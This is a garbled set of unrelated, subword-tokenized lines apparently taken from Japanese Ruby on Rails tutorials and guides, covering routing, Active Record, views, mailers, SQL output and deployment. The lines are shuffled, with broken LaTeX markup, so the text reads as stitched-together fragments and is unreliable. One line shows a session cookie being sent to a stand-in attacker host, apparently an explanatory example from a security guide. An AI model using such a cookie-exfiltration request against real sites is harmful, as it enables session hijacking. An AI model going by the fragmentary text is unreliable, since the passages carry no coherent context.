▁Command - S h if t - E コマンドで 上の テスト と同じ テスト を実行し 、 今度は 成功 する ことを確認する 。
▁従って 、 名前付き ルーティングヘルパー についても ▁" * _ path " ▁ ではなく ▁" * _ url " ▁ を使用する必要があります 。
▁| ▁GET ▁| ▁ / comments / : id / edit (▖ : format ) ▁| ▁comments # edit ▁| ▁edit _ sekret _ comment _ path ▁|
▁(\ ref { sec : the _ flash } で シンボル が 式 展開 されて 文字列 になった ことを思い出しましょう ) 。
▁ 基本 タイトル
▁ マ ー キ ング さ え され ていれば 、「 実際に エスケープ されている かどうか にかかわらず 」 その 文字列 は 信 頼 されます 。
▁Rails は I 18 n ▖ locale に 設定 できる シンボル を 制限 していない ので 、 ローカライズ に か ぎ らず 、 あらゆる 状 況 に合わせて 異なる コンテンツ を表示し 分ける ように することができます 。
▁作成した コードをリスト \ ref { code : action _ tests _ admin } に示します
▁=> ▁[ 42, ▁ 8, ▁17 , ▁6 ]
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁= ▁10
▁#### ▁` Date ▖ current `
▁ 最小化 方法は ビルトイン の オプション から 選 んだ り 、 独自 に 指定 したり することができます 。
▁Rails には ミドルウェアスタック を調べる ための 便利な Rake タスク があります 。
▁今度は 以下 が表示され ました 。
▁ 本 項 では 、\ ref { sec : unsuccessful _ signup s } の ユーザー登録 に 失敗した とき と 似 た 方法で 、 編集 に 失敗した場合 について 扱 っ ていきます 。
▁item ▁= ▁It em ▖ first
▁ 上で 実行される SQL は 以下のような もの になります 。
▁@ order _ count ▁= ▁@ customer ▖ orders ▖ size
▁ 逆 リレーションシップ をテストする 。
▁ 置き換え の 終 わ った 正しい アプリケーション コードをリスト \ ref { code : correct _ login _ failure } に示します 。
▁Rails の 作 者 David ▁H e in em er ▁Hansson 氏 による 有名な 動 画 「\ href { http :// www ▖ y out ub e ▖ com / watch ? v = G z j 723 L k R J Y } { 15 分 で 作る ブログ } ▁( 英語 )」 が 強 い 印 象 を与え た おかげで 、 Rails は 立 ち 上 げ 当 初 から 一 気 に 盛 り 上 が りました 。
▁\ text tt { GET } や その他の HTTP メソッド について
▁t ▖ belongs _ to ▁: account
▁validates ▁: email , ▁uniqueness : ▁true
▁ ╼ - --- == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 ╼ Content - Type : ▁text / html ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ < h 1> Password ▁reset </ h 1 >╼╼< p > To ▁reset ▁your ▁password ▁click ▁the ▁link ▁below : </ p >╼╼< a ▁ href =" http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / ╼ password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x HA / ╼ edit ?
▁| ▁| ▁30 1 ▁| ▁: mov ed _ permanent ly ▁|
▁今度は \ emph { 逆 の } 関係 を 考え ます ▟\ k ode { follower _ id } カラム を使用して 、 ユーザーの フォロワー の配列 を 取り出す ことができます 。
▁ それ でも count メソッドが アプリケーションの ボ ト ル ネ ッ ク になる ようなことがあ れば 、 さらに 高速 な \ href { http :// r ailscasts ▖ com / episodes / 23 - counter - cache - column }{\ emph { counter ▁cache } } を使う こともできます 。
▁ マイクロポストの 最 大文字 数を 140 文字 に 制限 する 。
▁ 記憶ダイジェスト 用に 生成 した マイグレーション
▁Relationship s コントローラ
▁| README ▖ rdoc | アプリケーション の概要 を 説明 する マニュアル を ここに 記 入 します 。
▁ 本書 では 可能な 限り 多くの 環境 をカバー する ようにしています が 、 システム が 変 わ れば 手順 が うまく い か ない こともあります 。
▁def ▁some _ method
▁ 渡す オプションは ` config ▖ ssl _ options ` で 設定 できます 。
▁Client ▖ order (" created _ at ")
▁さらに 、 アプリケーションに 変更 が 生じる たびに 、 まったく 同じ テストを 繰 り 返 さ なければなりません 。
▁その 代 わ り 、 FormTagHelper の メソッドでは 名前 と 値を 個 別 に 指定します 。
▁ 本書 を通して 開発 する アプリケーションは 、 最終的に は ユーザー や マイクロポスト 、 ログイン / ログアウト などの 認 証 機能 を持ちます が 、 まずは 簡単な トピック である 「 静的なページ の作成 」 から 始 め ます 。
▁ 順序 については ひ と まず ここで 区 切 ること に し 、 今度は マイクロポスト に 第 二 の 要素を 追加 してみましょう 。
▁ユーザーの フォロワー を表示する
▁ これはリスト \ ref { code : micropost _ model } で使用されていました 。
▁上のコード を実行すると 、 以下のような SQL が生成されます 。
▁ 有効な ユーザー
▁このメソッドは 、 RailsCast の 「\ href { http :// r ailscasts ▖ com / episodes / 27 4 - remember - me - reset - password } { remember ▁me }」 の 記事 を元に 選 び ました 。
▁ユーザー を新規作成する には 、\ href { http ://0▖0▖0▖0:3000/ users / new }{\ text tt { 図 2▖ 5}} の {2} {3} new {/3} {/2} ページ を表示します
▁ 括 弧 を使用して リスト \ ref { code : validates _ presence _ of _ name } を 同等の コード に 書き 換 え た もの を以下に示します 。
▁` has _ and _ belongs _ to _ many ` 関連付け に オブジェクトを ア サ イン すると 、 結合テーブル を更新する ために そのオブジェクト は自動的に 保存されます 。
▁" Invoice "▖ tableize ▁# ▁=> ▁" invoices "
▁Rails ▁4▖0 ▁ では ▁` vendor / plugin s ` ▁ 読み込み の サポート は 完全に 終 了 しました 。
▁ タイトル に ERB コード を使用した About ページのビュー
▁そこで 、 失敗 が発生する テストの 行 を ひ と まず コメントアウト しておきます ▁( リスト \ ref { code : comment _ out _ failing _ tests }) 。
▁# ▁ label (: article , ▁: title , ▁" A ▁short ▁title ", ▁class : ▁" title _ label ")
▁` auto _ discover y _ link _ tag ` ヘルパー を使用すると 、 多くの ブラウザ や フィード リ ー ダ ー で RSS フィード や Atom フィード を 検出 できる HTML が生成されます 。
▁#### ▁ メイラー を呼び出す
▁ ユーザー登録ページ に フラッシュメッセージ を追加する
▁-> ▁S eq ▁S can ▁on ▁articles ▁( cost = 0 ▖ 00 ▖ ▖ 28 ▖ 88 ▁rows = 8 ▁ width = 4 )
▁config ▖ generator s ▁do ▁| g |
▁ さ て 、 ブログ の 記事 と コメント が動作する ようになった ので 、 ここで ` app / views / articles / show ▖ html ▖ erb ` テンプレート を見てみましょう 。
▁{0}{1} 図 2▖1 0 {/1}{/0} の ▁[ Destroy ] ▁ リンクをクリックすると ユーザーが 削除され 、 index ページの ユーザーは 1 人 だけ になります
▁\ k ode { new } アクションに \ k ode {@ user } 変数 を追加する
▁最後に 、` f ` オブジェクトに対して ` submit ` を実行すると 、 フォームの 送信 ボタン が 作成されます 。
▁ INNER ▁JOIN ▁categories ▁ ON ▁articles ▖ category _ id ▁= ▁categories ▖ id
▁ invoices ▖ index _ by ( & : number )
▁ユーザー 編集 時の エラー 表示 を更新する
▁` serialize ▁: meta data , ▁JSON ` などの カスタム コ ー ダ ー を使用している場合 に 、 シ リ ア ル 化 属性 ▁( serialize d ▁attribute ) ▁ に ` nil ` を 割り当て ると 、 コ ー ダ ー 内で ` nil ` 値を 渡す の ではなく 、 データベースに ` NULL ` として 保存 される ようになりました ▁( ` JSON ` コ ー ダ ー を使用している場合 の ` " null " ` など ) 。
▁` via : ▁: all ` を指定すると 、 すべての HTTP 動詞 に マッチする 特別な ルーティング を作成 できます 。
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレスが \ emph { 本当に } 有効 であること を確かめるため に 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁(\ k ode { shared } ディレクトリ は 第 \ ref { cha : sign _ up } 章で 作成します ) 。
▁### ▁ 利用 可能な コールバック
▁ フォロワー を返します
▁ ファイル や ディレクトリ が 図 \ ref { fig : cloud 9 _ gemfile } のように 表示され ない場合 、 ナ ビ ゲ ー ター の 歯車 アイコン をクリックして ▁[ Re f re sh ▁File ▁T re e ] ▁ を 選択 します
▁さらに 、 Heroku の free ▁t i er ▁ プ ラン には 、 チュートリアル での 利用 を含む さまざまな 用 途 のための 機能 が 十分 過 ぎ る ほど 備わっています 。
▁ マルチ パ ート メール に 挿入され る パ ート の順序 は ` ActionMailer :: Base ▖ default ` メソッドの `: part s _ order ` によって 決 まり ます 。
▁` association = ` メソッドは 、 引数 の オブジェクトを そのオブジェクト に 関連付け ます 。
▁item ▖ increment !( : views )
▁### ▁ コントローラの 名前空間 と ルーティング
▁ リレーションシップ という パ ズ ル の 最後の 一 片 は 、\ k ode { user ▖ followers } メソッド を追加する ことです ▟ これは 上の \ k ode { user ▖ following } メソッドと 対 になります 。
▁作成した コードをリスト \ ref { code : persistent _ sessions _ test } に示します
▁ / users /1 にアクセス した 時の エラー ログ
▁ 自分の P C 上のコード に 満 足 が い く ようになった ら 、 変更を Git に コミット します 。
▁ シンボル は 、 Ruby 以外 では ご く 一部の 言語 に しか 採 用 されていない 特殊な データ 形式 です ▟ 最初は 奇 妙 に 思 う かもしれませんが 、 Rails では シンボル を ふ んだ ん に 使用している ので 、 すぐに 慣 れる でしょう 。
▁しかし 、 Rails の エンジン は 基本的に メ イン となる アプリケーション から 独 立 している ので 、 エンジン が 利用できる ` Application Controller ` は スコープ で 制限 されています 。
▁ 以前の Rails では 、 すべての アセット は ` public ` ディレクトリ の 下 の ` images `、` javascripts `、` stylesheets ` などの サブ フォルダ に置かれ ました 。
▁* ▁` config ▖ en coding ` は アプリケーション 全体 の エ ン コーディング を指定します 。
▁ 次 に進む前に 、 ここで 一 旦 、 有効な 送信 に対するテスト を書いて みます ▟ これによって 、 アプリケーションの 振る舞い を 検証 し 、 もし 今後 バグ が 埋 め 込 また ら それを 検 知 できるようになります 。
▁* ▁`: validate `
▁ パスワード 再設定 メールの プレビュー ▁( テキスト バージョン )
▁* ▁` has _ one ▁: through `
▁class ▁Article sController ▁< ▁Application Controller
▁WARNING : ▁` atomic _ write ` で 追 記 を行なう ことはできません 。
▁\ k ode { form \_ for } ヘルパーは 、 Active ▁Record の オブジェクト に 対応 した フォーム を生成する
▁# ▁=> ▁< input ▁id =" accept " ▁name =" accept " ▁type =" checkbox " ▁value = "1" ▁/>
▁ スペース が 集 ま って できた 文字列 は \ emph { 空 ▁( empty ) ▁ } とは 認 識 されません が 、\ emph { 空白 ▁( blank ) ▁ } である と 認 識 されている ことがわかります 。
▁この 新しい メソッドを リスト \ ref { code : user _ activation _ methods } に示します ▟ また 、 リファクタリング された アプリケーション コードをリスト \ ref { code : user _ signup _ refactored } と リスト \ ref { code : account _ activation _ refactored } に示します 。
▁ 多くの Unix 系 OS には 実 用 的な バージョンの SQLite 3 が 同 梱 されています ▟
▁上のように することで コードの 意味 が わかりやすく なり 、\ k ode { about _ path } の定義 を 変 え れば \ k ode { about _ path } が 使用されている すべての URL を変更 できる ため 、 柔 軟 性 が 高 まり ます 。
▁\ k ode { sudo } コマンド を実行すると デフォルトで root ▁( ス ー パ ー ユーザー ) ▁ に 切り 替 わ るため か 、 多くの 人 が sudo コマンドを ▁" super user ▁do " ▁ の 略 だと 誤 って 信 じ ています 。
▁これにより 、\ k ode { spec / request s } ディレクトリに \ k ode { static _ pages _ spec ▖ rb } が生成されます 。
▁ したがって 、 最終的な コードは リスト \ ref { code : image _ uploader _ resizing } のようになります ▟ これにより 、 大きな 画像 サイズ でも 適切に リ サイズ される ようになります ▁( 図 \ ref { fig : re size d _ image }) 。
▁Your ▁words ▁made ▁sense , ▁but ▁your ▁ s ar c as tic ▁to ne ▁did ▁not ▖
▁" Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App ▁| ▁About "
▁リスト \ ref { code : following _ followers _ action s _ routes } によって 生成される ルーティング テーブル を 表 \ ref { table : following _ routes } に示します 。
▁ タスク は それぞれ 以下の ようになります 。
▁### ▁ パーシャル を使用する
▁` except ` メソッドは 、 引数 で 指定された キー があれば レシーバの ハッシュ から 取り 除 きます 。
▁def ▁edit
▁ 基本的な 例を 以下 に いくつか 示 します 。
▁ { a : ▁1, ▁b : ▁1 } ▖ merge ( a : ▁ 0, ▁c : ▁2 )
▁続いて 、 対応する ` app / views / users / create ▖ js ▖ erb ` ビュー ファイル を作成します ▟ 実際の JavaScript はこの ビューで 生成 され 、 クライアント に 送信 されて そこで 実行されます 。
▁ この章 で作成した デモアプリケーション には 良い ところ もあります が 、 さまざまな 弱 点 もあります 。
▁たとえば ` Project sController ` を生成する と 、` app / assets / javascripts / projects ▖ js ▖ coffee ` ファイル と ` app / assets / stylesheets / projects ▖ css ▖ scss ` ファイルが 新しく 作成されます 。
▁ 数値 を 指定された 精 度 ( ` precision ` ) に変換 します ▟ デフォルトの 精 度 は 3 です 。
▁Rails とは 、 Ruby プログラミング言語 で 書かれた Web アプリケーション フレームワーク です 。
▁これにより 、` Supplier ` モデルのインスタンス で 以下の メソッドが 使える ようになります 。
▁ユーザー登録 に成功した場合 は 、 ページを 描画 する の ではなく 別の ページに \ emph { リダイレクト } する ように してみましょう 。
▁ 外部 データ の エンコード が 不 統 一 な 場合に よく 起 き る 症 状 としては 、 たとえば 画面 に 黒 い 菱 型 ◆ と 疑問符 が表示される という もの があります 。
▁これは 、 HTTP で PATCH 、 PUT 、 DELETE メソッド を使用 できるように する ミドルウェア です 。
▁変更の結果 を リスト \ ref { code : relationship _ belongs _ to } に示します 。
▁上のコードによって以下 が生成されます 。
▁ 動かない 理由 を 確認し たい 方は 、 実際に 実装 して ページネーション の リンクを クリック してみてください 。
▁ このような 危 険 がある から こ そ 、 編集 しても よい 属性 だけ を 許可 する ように 処理 された パラメータを 渡す ことが 重要 になります 。
▁しかし 例外 が 重要な もの であること も 確 か なので 、\ ref { sec : guid e _ to _ f ur the r _ resources } で 推 薦 した Ruby 本 で 例外 について 詳 しく 学ぶ ことをおすすめします
▁# logo ▁ { ▁background : ▁url ( <%= ▁asset _ data _ ur i ▁' logo ▖ png ' ▁%> ) ▁ }
▁ アプリケーション で使用する CSS ▁( C ascad ing ▁Style ▁Sheet ) 、 JavaScript ファイル 、 画像 などの アセット
▁この ` blorgh ` ディレクトリ には 、 エンジン で使用する その他の コントローラ を 置きます 。
▁ サインイン 失敗 を テスト できるように した ので 、 次は 実際に ユーザーを サインイン させ ましょう 。
▁from : ▁" no reply @ example ▖ com "
▁まずは 、 埋め込み Ruby が 使われ ている \ k ode { form \_ for } から \ k ode { end } まで の 外 側 の 構造 を 読み 解 い ていきます 。
▁これは 通常の 動作 です ▟ " M " という モジュール があると すると 、` M ` という 定数 が存在し 、 そこに モジュール が 保 持 されます 。
▁` yield ` を行なう 領 域 を 複 数 使用する レイアウト を作成する こともできます 。
▁* ▁ 独自の ルーティング 作成 法 ▁( リソース ベースの ルーティング が 推 奨 されます が 、` match ` メソッド による ルーティング も 可能です )
▁ どう して これで うまく い っている のでしょうか 。
▁ Turbolinks を有効に するには 、 Turbolinks を Gemfile に追加し 、 CoffeeScript の マニフェスト ▁( 通常 は ` app / assets / javascripts / application ▖ js ` ) ▁ に ` //= ▁require ▁ turbolinks ` を追加します 。
▁ 使用する パーシャル 名 は 、 コレクション 内の モデル名 に基いて 決定 されます 。
▁\ k ode { puts } メソッドでは \ emph { 副 作 用 } が 重要な 役 割 を 果 た します ▟ どう い う こと か と 言 う と 、\ k ode { puts ▁" foo "} は 文字列 「 " foo " 」 を 副 作 用 として ス ク リ ー ン に 表示 します が 、 返 り 値 には 「\ href { http :// www ▖ answer s ▖ com / nil } { 文字 どおり の 無 }」 である \ k ode { nil } を返します ▟ nil は 「 何 にも ない 」 こと を表す Ruby の 特別な 値 です 。
▁format ▖ html ▁ { ▁render ▁action : ▁" new " ▁ }
▁上のコードでは 、 文字列 が \ k ode { class } メソッドに 応答 し ており 、 その 文字列 が 所 属 する クラスを 単 に 返 している ことがわかります 。
▁ ╼ ▁create ▁app / helpers / users _ helper ▖ rb
▁╼╼ ▁\ subsection { Asset ▁Pipeline } ▁% ▁( fold )╼ ▁\ label { sec : the _ asset _ pipeline }╼╼ F
▁このコードは 、 値が \ k ode { nil } で なければ \ k ode { session [: return _ to ]} を 評価 し 、 nil であれば 与えられた デフォルトの URL を使用します
▁ 複数の ユーザーが 表示 された ユーザーインデックスページ に するためには 、 ブラウザで サインアップ ページ を表示し て ユーザーを 手 作業 で 1 人 ずつ 追加する という 方法 も \ emph { あります が } 、 せっかく なので Ruby と Rake を使用して ユーザーを 一 気 に 作成 しましょう 。
▁User オブジェクトは 有効 ではなく な った ので 、 データベースに保存 しようとすると 自動的に 失敗する はずです 。
▁ データベース を 背 後に 持つ Web アプリケーションを 本番環境で 動 か した
▁Rails ▁4▖0 以降 では 、 上のコード は エラー になります ▁( 上の 図 \ ref { fig : signup _ failure } および 図 \ ref { fig : signup _ failure _ rails _ debug } を参照 )▟ これにより 、 デフォルトで の セキュリティ が 高 め ら れ ました 。
▁つまり 、 以下のように 最小限 の 情報 で リソース を 一意 に 指定 できる ルーティング を作成する ということです 。
▁Last - Mo d if i ed : ▁Thu , ▁ 08 ▁May ▁2014 ▁01 : 2 4 : 14 ▁GMT ▁ Content - Type : ▁text / css
▁store _ location
▁\ k ode {@ user } を 保存 した 後 では 、 複 製 された ユーザーの メールアドレスが 既に データベース 内に 存在する ため 、 ユーザ の作成 は 無効 になるはずです 。
▁Ruby 自身 の ` Logger ` ロガー および ` Log 4 r ` ロガー のどちら とも 互換性 があります 。
▁ ローカル システム または クラウド IDE で 行う 次の 手順 は 、 リスト \ ref { code : rails _ command } の コマンド を使用した 最初の アプリケーションの 作成 です 。
▁次に Ruby をインストール します 。
▁もちろん 、 リスト \ ref { code : home _ view _ erb _ title } 、 リスト \ ref { code : help _ view _ erb _ title } 、 ▁リスト \ ref { code : about _ view _ erb _ title } の ビュー には 、 レイアウト と 重複 する HTML が まだ 残 っている ので 、 それら を削除し て 、 内部 の コンテンツ だけ 残 します 。
▁ただし 、 配列 の中に ` id ` に応答する 項目 がある場合 は 、`: db ` という シンボル を 引数として 渡す ことで 対応 できる 点 が異なります 。
▁ここで 、 Rails はその 文字列を Location ヘッダ フィールド に 入 れ て 302 ( リダイレクト ) ステータス を ブラウザに送信 します 。
▁create ▁test / mailers / preview s / user _ mailer _ preview ▖ rb
▁# ▁` only ` を使用する 前の オ リ ジ ナ ル の クエリ
▁ ユーザー登録ページ ▁ / signup ▁ のルーティング は 、 Users コントローラ ー の \ k ode { new } アクションに 既に 紐 付け ら れ ている ことを思い出してください ▁( リスト \ ref { code : signup _ route })▟ したがって 、 次の ステップ は 、 ▁\ k ode { form _ for } の 引数 で 必要となる User オブジェクト を作成する ことになります
▁### ▁` belongs _ to ` 関連付け
▁* ▁` none `
▁Ruby ▁gem ごとに バージョン を明示的に指定 した \ k ode { Gemfile } 。
▁| Rake file | この ファイル には 、 コマンドライン から 実行 できる タスク を記述し ます 。
▁ ActionDispatch :: Session ▖ const _ get ( store ▖ to _ s ▖ camelize ) ▁:
▁ 継 承 の関係 を {0}{1} 図 4 ▖3{/1}{/0} に示します 。
▁ 新しい セッション の ページ ▁( ログイン )
▁{0} リスト 2 ▖9{/0} ▁╼╼{1} Microposts コントローラの 骨 格 ▁ {2} {/2} ▁ {3} app / controllers / microposts _ controller ▖ rb {/3} {/1}
▁$("# new _ article ")▖ append ▁ xhr ▖ response T ext
▁\ chapter { ユーザーの 更新 ・ 表示 ・ 削除 } ▁% ▁( fold )╼\ label { cha : updating _ showing _ and _ deleting _ users }╼╼
▁``` html + erb
▁ ある 環境 において 、 最終的な 決定 権 を持つ のは アプリケーション 自身 です 。
▁ モデル名 は 単数形 ▁( User ) ▁ ですが 、 テーブル名 は 複数形 ▁(\ k ode { users }) ▁ です ▟ これは Rails で 用 い られる 言葉 の慣習 を 反 映 しています ▟ モデル は ひ と り のユーザー を表す の に対し 、 データベースの テーブル は 複数の ユーザー から 構成 されます 。
▁上のコードは 、` Product ` モデル を作成し 、 データベースの ` products ` テーブルに マッピング されます 。
▁これ を利用する ことで ビュー が 改 修 しやすくなり 、 コード も 読みやすく なります 。
▁ コンピュータ は コードが 醜 く ても 気 に しません が 、 開発者 にとって は そう は い き ません ▟ だ から こ そ 、 頻繁に リファクタリング を 実 施 し 、 コードを 清 潔 な 状態 に 保 ち 続ける こと が重要です 。
▁INFO : ▁ こうした メソッド を実行すると 、 実際に 変換 が 行われた かどうか にかかわらず 、 安全 を表す ビ ッ ト は 常に オフ になります 。
▁ ステータスフィード のテスト
▁( 上の コマンド から わかるように 、 モデル名 以外の 引数 は 不要 です 。
▁### ▁ モデルと コントローラ をオーバーライドする
▁\ k ode { authenticated ?} が リスト \ ref { code : generalized _ authenticated _ p } の ようになった ことで 、 や っ と \ k ode { edit } アクション を書く 準備ができました ▟ この アクションは 、\ k ode { params } ハッシュ で 与えられた メールアドレス に対応する ユーザーを 認 証 します 。
▁GET ▁ http :// www ▖ attacker ▖ com / _ app _ session = 8 36 c 1 c 2 5278 e 5 b 32 1 d 6 be a 4 f 19 c b 57 e 2
▁belongs _ to ▁: supplier
▁ユーザーの index ページ 用の CSS
▁ 自分 が 導 入 した 変更 セット が含まれている ことを確認します 。
▁なお 、 リスト \ ref { code : following _ tests } では 、 次の コード を加え ています が
▁ これはリスト \ ref { code : micropost _ model _ image _ validation } で使用されていました 。
▁### ▁` i nclusion `
▁ これを実現 するには 、` ActionController :: TestCase # process ` を 以下のように ` test / test _ helper ▖ rb ` で ラ ッ プ します 。
▁gem ▁' coffee - rails ', ▁' ~ > ▁3▖2 ▖ 2 '
▁次に 、 before フィルター の \ k ode { logged \_ in \_ user } に \ k ode { index } アクション を追加して 、 この アクションを 保 護 します ▁( リスト \ ref { code : logged _ in _ user _ index }) 。
▁<%= ▁render ▁' form ' ▁%>
▁これにより 、[ Follow ] ▁ ボタン が ▁[ Unfollow ] ▁ に 変 わ り 、 Hobbes ▁ の ▁[ followers ] ▁ カウント が 1 人 増え ます ▁( 図 \ ref { fig : page _ flow _ other _ profile _ unfollow _ button _ mockup }) 。
▁Active ▁Record において 、 オブジェクト とは 永続的 な データ であり 、 その データ に対する 振る舞い で もあります 。
▁ 出力する アクション を指定する には 、 文字列 の他に シンボル を使用することもできます 。
▁ アプリケーションコード は既に 実装 済み なので 、 今回の 統合テスト も含め 、 全て のテスト が ▁\ passing ▁ になるはずです 。
▁( 以前 同様 、 高速 化 のために Rails は データベース の中で 合 計 を 計算 する ようにしています ▟)
▁これは 、 最初の 2 つの マイグレーション はこの コマンド が 初めて 実行 された ときに コピー 済み である ためです 。
▁#### ▁number _ to _ percentage
▁ デフォルトの Rails アプリ 構造 ▁({0}{1} 図 1 ▖ 4 {/1}{/0} ) ▁ を 眺 め てみると 、\ k ode { app / } という ディレクトリ があり 、 その中に 「\ k ode { models }」 「\ k ode { views }」 「\ k ode { controllers }」 という 3 つの サブディレクトリ がある ことに 気付いた方もいると思います 。
▁ では ここで 関数 定義 を click ハンドラ の 外 に 追 い 出 し 、 CoffeeScript で 書き換えて みましょう 。
▁#### ▁ label
▁これで 、 Heroku アプリ の アドレス 以外 は 図 \ ref { fig : heroku _ app } のとおり に表示される はずです 。
▁しかし 既に \ k ode { correct _ user } ▁before _ filter で \ k ode {@ user } を定義し たので 、 update アクションと edit アクション から このコード を 削除 で きました 。
▁上の 行 で 重要な 部分 は 実は CSS コメント の中に あります ▟ 以下の行 は 、 適切な ファイルを インクルード するために Sprockets によって 使用されます 。
▁id = \ text tt {1} のユーザー を更新する アクション
▁# ▁=> ▁#< Client ▁id : ▁ 22 1, ▁first _ name : ▁" Russ el ">
▁( 2▖ ▖ 3 )▖ include ?( Math :: E ) ▁# ▁=> ▁true
▁ 画像アップロード をテストする ための テンプレート
▁\ k ode { ▖ erb } の詳細については \ ref { sec : slightly _ dynamic _ pages } で説明します が 、 ファイル名 に \ k ode { ▖ html } が含まれている こと から わ か る 、 基本的に は HTML と同じ ような 構造 になっています ▁(\ ref { code : raw _ home _ view }) 。
▁\ ref { sec : requiring _ logged _ in _ users } では 、 深 刻 な セキュリティ上の 欠 陥 を見 逃 してしまう テスト を見 てきました ▟ そこで 本 項 では 、 セキュリティ モデル が正しく 実装 されている 確 信 を持つ ために 、 テスト駆動開発 で 進 め ていきます 。
▁@ comment ▖ destroy
▁ 探 している ビュー が そこに ない場合 、 続いて その ディレクトリ を持つ すべての エンジンの ` app / views ` ディレクトリ を 探 索 します 。
▁class _ name ▁= ▁class _ name ▖ singularize ▁if ▁collection ?
▁ ところで 、 サンプルアプリケーション を 既に Heroku 上に デプロイ している場合 は 、\ text tt { heroku ▁run ▁console } という コマンドを 打 つ ことで 、 本番環境 を確認する ことができます 。
▁( 図 \ ref { fig : MVC } では 簡 単 の ため ルーター は 省略 しています が 、\ ref { sec : mvc _ in _ action } で 詳 しく 解説します ) 。
▁{0}{1} 図 2▖1 4 {/1}{/0} に示した とおり 、 マイクロポスト の内容 が 長 すぎる という \ emph { エラーメッセージ } が Rails によって 表示されます
▁< em >< b > emph ▁& amp ; ▁ bo ld </ b ></ em >
▁ プロフィール ページに フォロー 用 フォーム と フォロワー の 統 計 情報 を追加する
▁ 有効化 が成功した 場合 に表示される プロファイル ページ
▁ユーザー アカウント を 有効 / 無効 に する方法 については 、 「\ href { http :// www ▖ google ▖ com / search ? q = state + ma ch in es + in + rails } { Rails ▁ ス テ ート マシン }」 で ネ ッ ト を検索し てみてください 。
▁Bitbucket に toy アプリ の リポジトリ を作成する
▁def ▁a _ method _ used _ for _ validation _ p urpose s
▁ アセット ファイル の内容 が 少し でも 変わる と 、 アセット ファイル名 も 必ず それ に応じて 変 わ ります ▁( 訳 注 : ▁M D 5 の 性 質 により 、 異なる ファイル から た また ま 同じ フィンガープリント が 生成される ことは ほぼ ありません ) 。
▁従って 、 や む を 得 ない 理由 が ない限り この オプションは false に しないでください 。
▁ 従来 の Rails 開発 の慣習 と 異なる 箇所 が 1 つ あります ▟ Microposts リソース への インターフェイス は 、 主 に ユーザー と 静的ページ の コントローラ を経由して 実行される ので 、 Microposts コントローラ には \ k ode { new } や \ k ode { edit } のような アクションは 不要 という ことになります ▟\ k ode { create } と \ k ode { destroy } があれば 十分です 。
▁次に 、 遠隔 にある サーバー の SSL を セットアップ します 。
▁**` ActionDispatch :: Cookie s ` **
▁class ▁S and box E mail In ter ce p to r
▁これで 、 本番環境 用の Web サーバ の設定 は 完了 しました ▟ これらの 変更を コミット し 、 デプロイ してみましょう
▁` collection ▖ clear ` メソッドは 、 コレクション から すべての オブジェクトを 削除します 。
▁ 有効化トークン は 本質的に 仮 の もの で なければならない ので 、 この モデルの \ k ode { attr \_ accessor } に もうひとつ 追加 しました 。
▁上のコードでは 、 ユーザー プロフィール に関する ほぼ 全て ▁( たとえば ページ にアクセス したら な ん ら か の 理由 で エラーが発生し ない かどうか など ) ▁ を テスト でき ていることに注目してください 。
▁作成した コードをリスト \ ref { code : valid _ user _ test } に示します
▁ 関連付け が 存在しない ことを確認 したい場合は 、 関連付けられたオブジェクト 自体 が 存在しない かどうかを確認 し 、 そのオブジェクト が 関連付け に マッピング された 外部キー でない ことを確認する 必要があります 。
▁( M ac 用の G row l の 通知 機能 を使用する のであれば 、\ href { http :// g row l ▖ info / download s } { G row l } を App le の App ▁ Store で 購 入 する必要があります ▟ 値 段 は 大 した ことはありません ) 。
▁Article ▖ where (' id ▁> ▁10 ')▖ limit ( 20 )▖ order (' id ▁as c ')▖ unscope (: order )
▁{0}{1} 第 3 章 {/1}{/0} から デプロイ を して 来 ましたが 、 実際に データを \ emph { 操作 できるように する } デプロイ は 初めて です ▟ そこで 、 この 機 会 に プロ レベル の デプロイ 方法 について 説明 していきます 。
▁` find _ each ` では 、` where ` などの Active ▁Record メソッドを 連 鎖 ▁( chain ) ▁ させる ことで 条件 を追加する ことができます 。
▁=> ▁6
▁=> ▁" 1, ▁2, ▁3 , ▁4 "
▁ 一 例として 、 かつ て 筆者 が 作成した テストスイート では 、 Sessions ヘルパー から {0} log _ in {/0} メソッドを う っかり 削除 し てしまった にもかかわらず 、 テストが ▁\ passing ▁ のまま 変 わ ら なかった こと があり ました 。
▁ prev _ year ▁( last _ year )
▁before _ add : ▁ [: check _ credit _ limit , ▁: calculate _ ship p ing _ cha r ge s ]
▁ この章 の 全体 に わ た って 、\ emph { 関数 } という 言葉 と \ emph { メソッド } という 言葉 が 混 在 している ことを 前 も って お 詫 び いた します ▟ Ruby では 関数 と メソッド には 何 の違い も ありません ▟ すべての メソッドは 関数 であり 、 すべての 関数 は メソッドで もあります ▟ それ も これも 、 あらゆる もの が オブジェクト である からです 。
▁CSS コードを サニタイズ します 。
▁with _ options ▁if : ▁: is _ admin ?
▁NOTE : ▁`: controller ` パス セグメント を使用する場合 、`: namespace ` や `: module ` を 併 用 する ことはできません 。
▁` redirect _ to ` の 引数に は どんな 値 も 指定 できます が 、` link _ to ` や ` url _ for ` を使用する のが普通です 。
▁ 通常 、 Git の コミット は なるべく こ ま め に 行う ように し 、 更新 を あまり ため ないこと が望ましい のですが 、 この章 の 締 め く く り として サイズ の 大きな コミット を 1 度 だけ 行う ぐらい であれば 問題ありません 。
▁ オブジェクト が存在する かどうか は 、` exists ?
▁ データベースに マイクロポスト がない という 予 想 は 、 以下のように 書く ことができます 。
▁client ▁= ▁Client ▖ first
▁#### ▁` has _ many ` で 追加される メソッド
▁Rails アプリケーション を表示する には 、 ローカル サーバー の場合は \ href { http :// localhost :3000/ } { http :// localhost :3000/ } をブラウザで開き ます ▟ クラウド IDE の場合は 、[ S ha re ] ▁ を開いて 、 開 き たい アプリケーションの アドレス をクリックします ▁( 図 \ ref { fig : s ha re _ workspace }) 。
▁詳細については 、 benchmark / ips ▁ の ▁[ README ]( https :// github ▖ com / e v an ph x / benchmark - ips / blo b / master / README ▖ md ) を参照してください 。
▁ テストスイート が 緑色 ▁( 成功 ) ▁ になる ためには 、 テキスト ファイルを Ruby コード に マ ッ プ する \ emph { ステップ } ファイル を作成します 。
